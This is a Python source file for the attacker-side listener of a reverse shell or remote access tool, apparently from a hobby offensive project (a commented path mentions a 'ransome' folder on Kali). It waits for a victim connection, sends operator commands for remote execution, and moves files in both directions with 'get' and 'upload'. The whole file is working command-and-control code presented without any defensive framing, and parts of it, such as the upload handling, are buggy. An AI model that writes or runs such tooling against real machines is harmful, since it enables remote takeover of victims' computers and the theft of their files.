import socket, json, base64



class Listener():
	"""docstring for Listener"""
	venom = "exit"
	def __init__(self, IP, port):
		# self.IP = IP
		# self.port = port
		self.listner = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
		self.listner.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR, 1)
		self.listner.bind((IP,port))
		self.listner.listen(0)
		print('[+]Waiting for incoming connection')
		self.clientsocket, addr = self.listner.accept()
		print(f"[+]Connection is successfully established with {addr}")

	def SendData(self, data):
		try:
			json_data = json.dumps(data)
		except TypeError:
			print('Type Error occured!')
		self.clientsocket.send(bytes(json_data,encoding='utf-8'))
		if self.venom in data:
			self.listner.close()
			exit()

	def ReceiveData(self):
		json_data = ""
		while True:
			try:
				json_data += self.clientsocket.recv(1024).decode('utf-8')
				return json.loads(json_data)
			except ValueError :
				continue

	def RemoteExecution(self, command):
		# self.command = command
		self.SendData(command)
		return self.ReceiveData()

	def WriteFile(self, path, content):
		with open(path, 'wb') as thefile:
			thefile.write(base64.b64decode(content))
		print("File is successfully downloaded ..")
		
	
	def	ReadFile(self, path):
		with open(path, 'rb') as thefile:
			return base64.b64encode(thefile.read())

	def run(self):
		while True:
			command = input('>') 

			if 'upload' in command:
				command = command.split(' ')
				if command[0] == 'upload' and len(command) > 1:
					content = self.ReadFile(command[1])
					command.append(base64.b64decode(content))
					command = ' '.join(command)

			
			result = self.RemoteExecution(command)

			if 'get' in command:
				command = command.split(' ')
				if command[0] == 'get' and len(command) > 1:
					try:
						self.WriteFile(command[2], result)
					except:
						print("Syntax: get file_path file_name")
			
			
			print(result)

			
			

			
			


# try:
IP = 'localhost'
port = 1338
listener = Listener(IP, port)
listener.run()
# except Exception as e:
# 	with open("/home/kali/Documents/ransome/error.txt", 'w') as thefile:
# 		e = str(e)
# 		thefile.write(e)
# 	print("An error occured")